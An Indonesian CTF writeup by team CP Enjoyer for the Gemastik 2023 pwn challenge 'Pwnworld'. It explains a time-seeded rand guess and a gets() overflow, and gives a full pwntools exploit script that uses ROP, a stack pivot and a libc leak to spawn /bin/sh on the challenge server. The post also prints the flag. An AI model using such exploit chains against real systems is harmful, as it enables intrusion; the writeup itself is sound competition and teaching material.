+++
title = "Gemastik 2023"
date = 2023-07-31
draft = false
categories = ["CTF Writeups"]
tags = ["gemastik", "pwn", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Pwn (Pwnworld) di Gemastik 2023."
+++

Writeup dari tim **CP Enjoyer** untuk Gemastik 2023 — hanya bagian **Pwn**.

---

# Pwn

## Pwnworld (356 pts)

{{< admonition quote "Deskripsi" >}}
**Author:** Linz

`nc ctf-gemastik.ub.ac.id 10012`

**Attachments:** `pwnworld.zip`
{{< /admonition >}}

### Analisis awal

Diberikan file `pwnworld.zip` yang berisi binary `pwnworld` dan `libc.so.6`. Terdapat fungsi `main` yang terlihat menggunakan fungsi `gets`. Tentu saja, ini akan mengakibatkan buffer overflow. Namun, untuk memanggil fungsi `gets` tersebut, kita harus berhasil melewati fungsi `game`. Fungsi `game` meminta kita untuk menebak angka random yang didapatkan dari fungsi `get_random`. Fungsi `get_random` menggunakan fungsi `rand` untuk mendapatkan angka random tersebut dan `srand(time(0))` untuk menge-set seed yang digunakan fungsi `rand`. Terdapat vulnerability di sini karena `srand` menggunakan seed `time(0)` yang mengembalikan waktu saat fungsi `time` tersebut dipanggil. Maka, hasil fungsi `time(0)` akan dengan mudah didapatkan. Dan dengan seed diketahui, setiap pemanggilan `rand` setelahnya akan menghasilkan output yang konsisten.

Terdapat dua cara untuk mendapatkan hasil fungsi `rand` pada script kita. Yang pertama adalah dengan membuat suatu program C sederhana yang akan memanggil `srand(time(0))` dan meng-output hasil pemanggilan `rand()`. Program ini akan dipanggil setelah binary `pwnworld` dijalankan atau setelah berhasil terhubung ke server. Ini dapat dilakukan dengan modul `subprocess` pada Python. Namun, kami menggunakan cara yang lain, yaitu dengan menggunakan modul `ctypes` pada Python. Dengan menggunakan modul `ctypes`, kita dapat memanggil fungsi-fungsi pada bahasa C tanpa harus membuat suatu subprocess.

### Mendapatkan shell

Setelah melewati fungsi `game`, suatu alamat pada bss akan di-leak program sehingga dapat mem-bypass mitigasi PIE dan kita dapat menggunakan buffer overflow dari fungsi `gets` untuk melakukan stack pivot dan ret2libc. Berikut adalah script kami.

**solve.py**

```python
#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
from math import floor
import sys
import os
import random

exe = ELF("./pwnworld_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.37.so")

context.binary = exe
context.log_level = 'debug'

cmd = '''
set max-visualize-chunk-size 0x500
b *main
b *main+212
b *game+172
c
c
c
'''

def find_offset(r, size=100):
    temp = context.log_level
    context.log_level = 'CRITICAL'
    r.sendline(cyclic(size))
    r.wait()
    r.close()
    core = r.corefile
    context.log_level = 'INFO'
    log.success(f'Crashed at : %s' % p32(core.fault_addr & 0xffffff).decode())
    log.success(f'Offset : %s' % cyclic_find(core.fault_addr & 0xffffff))
    context.log_level = temp
    os.remove(core.path)

def conn(cmd):
    global cdll
    if 'i' in sys.argv:
        context.log_level = 'info'
    elif 'c' in sys.argv:
        context.log_level = 'critical'

    if '1' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
        current_time = int(floor(time.time()))
        cdll.srand(current_time)
    elif '2' in sys.argv or 'server' in sys.argv:
        r = remote('ctf-gemastik.ub.ac.id', 10012)
        current_time = int(floor(time.time()))
        cdll.srand(current_time)
    else:
        if context.arch == 'i386' or context.arch == 'amd64':
            r = process([exe.path], aslr=False)
            current_time = int(floor(time.time()))
            cdll.srand(current_time)
        else:
            port = str(random.randint(1000, 9999))
            cmd = 'file %s\ntarget remote localhost:%s' % (exe.path, port) + cmd
            if context.arch == 'arm' and context.endian == 'little':
                r = process(['qemu-arm-static', '-g', port, exe.path])
            elif context.arch == 'mips' and context.endian == 'little':
                r = process(['qemu-mipsel-static', '-g', port, exe.path])
            sleep(1)
            gdb.attach(r, cmd)
    return r

def main():
    global cdll
    cdll = CDLL("libc.so.6")
    r = conn(cmd)
    payload = flat(str(cdll.rand() % 417).encode())
    print(payload)
    r.sendlineafter(b'guess? ', payload)
    r.recvuntil(b'this to you: 0x')
    leak = int(r.recvlineS(), 16)
    print(hex(leak))
    exe.address = leak - exe.sym.gift
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    leave = rop.find_gadget(['leave', 'ret']).address
    payload = flat(cyclic(272), leak, pop_rdi, exe.got.puts, exe.sym.puts, pop_rdi,
                   leak, exe.sym.gets, leave)
    r.sendlineafter(b'feedback? ', payload)
    r.recvline()
    libc_leak = u64(r.recvline().rstrip().ljust(8, b'\0'))
    libc.address = libc_leak - libc.sym.puts
    print(hex(libc.address))
    pop_rax = next(libc.search(asm('pop rax; ret'), executable=True))
    pop_rsi = next(libc.search(asm('pop rsi; ret'), executable=True))
    pop_rdx = next(libc.search(asm('pop rdx; ret'), executable=True))
    syscall = next(libc.search(asm('syscall'), executable=True))
    sleep(0.1)
    payload = flat(b'/bin/sh\0', pop_rdi, exe.sym.gift, pop_rsi, 0, pop_rdx, 0,
                   pop_rax, 0x3b, syscall)
    r.sendline(payload)
    context.log_level = 'debug'
    r.interactive()

if __name__ == '__main__':
    main()
```

{{< image src="pwnworld-flag.png" caption="Berhasil mendapatkan shell dan flag" >}}

> Flag: `gemastik{292f8a061612f0555b663e24fb930f76aae6a31eac65a8ec644f1698dc01fbe7}`
